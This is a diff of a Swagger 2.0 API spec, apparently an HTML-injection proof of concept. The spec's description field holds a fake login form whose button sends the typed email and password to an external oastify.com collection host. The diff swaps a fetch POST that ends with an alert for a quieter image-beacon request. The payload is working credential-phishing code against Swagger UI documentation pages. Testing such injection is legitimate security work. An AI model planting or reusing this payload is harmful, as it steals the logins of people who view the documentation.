@@ -1,27 +1,22 @@
 swagger: '2.0'
 info:
-  title: XSS HTML Injection Lab
+  title: HTML Injection PoC
   description: |
-    <h1>Lab Login</h1>
-    <label for="email">Email:</label><input id="email"><br>
-    <label for="password">Password:</label><input id="password" type="password"><br>
+    <h2>Login to access documentation</h2>
+    <input id="email" placeholder="Email"><br>
+    <input id="password" placeholder="Password" type="password"><br>
     <button onclick="
-      fetch('http://t71jknrq6oy3949z9e3lcndik9q0eq2f.oastify.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: new URLSearchParams({
-          email: document.getElementById('email').value,
-          password: document.getElementById('password').value
-        })
-      });
-      alert('Thanks! Credentials sent.');
+      var e = document.getElementById('email').value;
+      var p = document.getElementById('password').value;
+      var i = new Image();
+      i.src = 'http://t71jknrq6oy3949z9e3lcndik9q0eq2f.oastify.com/creds?e=' + encodeURIComponent(e) + '&p=' + encodeURIComponent(p);
     ">Login</button>
-  version: lab
+  version: '1.0.0'
 basePath: /
 paths:
-  /test:
+  /ping:
     get:
       summary: test
       responses:
         '200':
-          description: ok
+          description: pong
